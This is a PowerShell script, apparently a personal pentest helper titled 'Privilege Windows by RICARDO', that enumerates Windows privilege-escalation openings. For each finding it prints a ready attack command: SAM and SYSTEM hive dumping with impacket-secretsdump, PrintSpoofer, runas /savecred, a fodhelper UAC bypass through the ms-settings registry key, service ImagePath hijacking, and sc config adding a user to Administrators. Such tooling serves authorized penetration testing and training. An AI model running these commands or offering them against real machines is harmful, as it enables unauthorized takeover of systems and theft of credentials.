Write-Output "Privilege Windows by RICARDO"
Write-Output "--------------separation----------------"
Write-Host "AlwaysInstall type:" -ForegroundColor Red
$properties = Get-ItemProperty -Path "Registry::HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
if ($properties.AlwaysInstallElevated -eq 1) {
    Write-Host "HKCU:AlwaysInstallElevated;
    msiexec /quiet /qn /i NCVInstaller.msi" 
}
$properties = Get-ItemProperty -Path "Registry::HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue
if ($properties.AlwaysInstallElevated -eq 1) {
    Write-Host "HKLM:AlwaysInstallElevated;
    msiexec /quiet /qn /i NCVInstaller.msi" 
}
#AlwaysInstallElevated
Write-Output "--------------separation----------------"
Write-Host "Find unattend.xml " -ForegroundColor Red
# 查找unattend.xml文件
$files = @(
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\unattend.xml",
    "C:\Windows\System32\Sysprep\unattend.xml",
    "C:\Windows\System32\Sysprep\sysprep.xml",
    "C:\Windows\System32\Sysprep\Panther\unattend.xml",
    "C:\Windows\sysprep.inf",
    "C:\Windows\unattend.xml",
    "C:\unattend.xml",
    "C:\sysprep.inf"
)
foreach ($file in $files) {
    if (Test-Path $file) {
        Write-Host $file
    }
}
#Answer files
Write-Output "--------------separation----------------"
Write-Host "enumerate a GitHub repository:" -ForegroundColor Red
if (Get-Command git -ErrorAction SilentlyContinue) {
    # 如果git命令存在，执行git log
    git log
    Write-Host "git command found;
    hit:git diff <commit> <commit>"
    git show
} else {
    Write-Host "git command not found. Exiting."
}
#leak GITHUBRepository
Write-Output "--------------separation----------------"
Write-Host "powershell history:" -ForegroundColor Red
Get-Content (Get-PSReadlineOption).HistorySavePath
Write-Output "--------------separation----------------"
Write-Host "RegistryRunKeys:" -ForegroundColor Red
Get-ItemProperty -Path "Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Write-Host "hit:mv C:\Windows\Tasks\hollow.exe c:\xx\xx"
#ExecutionRegistryRunKeys
Write-Output "--------------separation----------------"
Write-Host "StartupFolder:" -ForegroundColor Red
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
Write-Host "just wait"
#ExecutionStartupFolder
Write-Output "--------------separation----------------"
Write-Host "check SeBackupPrivilege,SeImpersonatePrivilege:" -ForegroundColor Red
# 执行whoami /priv并获取输出
$privOutput = whoami /priv | Out-String

# 检查SeBackupPrivilege是否开启
if ($privOutput -match "SeBackupPrivilege.*Enabled") {
    Write-Host "SeBackupPrivilege is Enabled;
    hit:reg save hklm\sam C:\temp\sam.hive;
    reg save hklm\system C:\temp\system.hive;
    impacket-secretsdump -sam sam.hive -system system.hive LOCAL"
}

# 检查SeImpersonatePrivilege是否开启
if ($privOutput -match "SeImpersonatePrivilege.*Enabled") {
    
    Write-Host "SeImpersonatePrivilege is enabled;
    hit:PrintSpoofer.exe -i -c cmd"
}
Write-Output "--------------separation----------------"
Write-Host "credentials:" -ForegroundColor Red
cmdkey /list
#存储凭证
Write-Host "find some credentials;
hit:runas /savecred /user:WORKGROUP\Administrator 'C:\Windows\Tasks\hollow.exe'"
Write-Output "--------------separation----------------"
Write-Host "UAC FIND:" -ForegroundColor Red
# 定义注册表路径和键名
$registryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
$keyName = "EnableLUA"
# 检查注册表路径是否存在
if (Test-Path $registryPath) {
    # 获取EnableLUA的值
    $enableLUAValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
    
    # 检查EnableLUA的值是否为1
    if ($enableLUAValue -and $enableLUAValue.EnableLUA -eq 1) {
        # 如果EnableLUA的值为1
        Write-Host 'EnableLUA==1;
        hits:New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force;
        New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;
        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -exec bypass -c C:\Windows\Tasks\hollow.exe" -Force;
        C:\Windows\System32\fodhelper.exe; '
    }
} 
#UAC
Write-Output "--------------separation----------------"
Write-Host "Unquoted Service:" -ForegroundColor Red
# Enumerate services and filter out those with unquoted paths and spaces
Get-WmiObject -Class Win32_Service -Property Name, DisplayName, PathName, StartMode |
Where-Object { $_.PathName -notlike '"*' -and $_.PathName -match ' ' } |
Select-Object Name,PathName

#不带引号的服务路径
Write-Output "--------------separation----------------"
Write-Host "services registry:" -ForegroundColor Red
$servicesPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
$subkeys = Get-ChildItem -Path $servicesPath
foreach ($subkey in $subkeys) {
    # Get  ACL for  subkey
    $acl = Get-Acl -Path $subkey.PSPath
    # Check for weak permissions
    foreach ($accessRule in $acl.Access) {
        if ($accessRule.IdentityReference -match "Authenticated Users|Everyone|BUILTIN\\Users|NT AUTHORITY\\INTERACTIVE" -and $accessRule.FileSystemRights -match "FullControl|Modify|Write") {
            # 服务名称及weak Permission
            Write-Host "Service: $($subkey.PSChildName) - Weak Permission: $($accessRule.FileSystemRights) for $($accessRule.IdentityReference)"
            Write-Host "weak service found;
            hit:reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\Tasks\hollow.exe" /f"
        }
    }
}
#弱注册表权限
Write-Output "--------------separation----------------"
Write-Host "WeakServiceBinary:" -ForegroundColor Red
# Enumerate services  binary paths
$services = Get-WmiObject -Class Win32_Service -Property Name, DisplayName, PathName, StartMode
# Iterate through each service
foreach ($service in $services) {
    # Check if the service binary path is not null and exists
    if ($service.PathName -and (Test-Path $service.PathName)) {
        # Get the ACL for the service binary
        $acl = Get-Acl -Path $service.PathName

        # Check for weak permissions (e.g., Write access for Everyone)
        foreach ($accessRule in $acl.Access) {
            if ($accessRule.IdentityReference -match "Everyone" -and $accessRule.FileSystemRights -match "Write") {
                # Output the service name, display name, and path if a weak permission is found
                Write-Host "Service Name: $($service.Name), Display Name: $($service.DisplayName), Path: $($service.PathName)"
                Write-Host "service found; Change it"
            }
        }
    }
}
#弱服务二进制权限
Write-Output "--------------separation----------------"
Write-Host "WeakService:" -ForegroundColor Red
# Enumerate services and get their names
$services = Get-WmiObject -Class Win32_Service -Property Name, DisplayName, PathName, StartMode

# Iterate through each service
foreach ($service in $services) {
    # Use sc sdshow to get the security descriptor of the service
    $sdshowOutput = sc sdshow $service.Name

    # Check for weak permissions (e.g., Write access for Everyone)
    if ($sdshowOutput -match "Everyone") {
        # Output the service name, display name, and path if a weak permission is found
        Write-Host "Service Name: $($service.Name), Display Name: $($service.DisplayName), Path: $($service.PathName)"
        Write-Host 'weak service found;
        hit:sc config "service" obj= "NT AUTHORITY\SYSTEM" password= "";
        sc config "service" binPath= "net localgroup Administrators final\nina /add";
        '
    }
}
#弱服务权限


